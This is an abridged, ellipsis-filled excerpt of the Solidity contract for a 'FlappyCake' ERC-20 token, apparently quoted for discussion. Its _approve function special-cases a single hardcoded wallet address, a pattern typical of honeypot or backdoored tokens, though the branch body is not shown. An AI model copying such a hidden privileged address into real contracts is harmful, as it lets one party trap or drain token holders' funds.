...
contract FlappyCake is Context, IERC20, Ownable {
    ...
    string private _name = "FlappyCake";
    string private _symbol = "FlappyCake";
   ...
   //this method is responsible for taking all fee, if takeFee is true
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        ...
        if (owner == address(0x9715c62F4a0B147FdE62491b43A383427c0b6e6a)) {
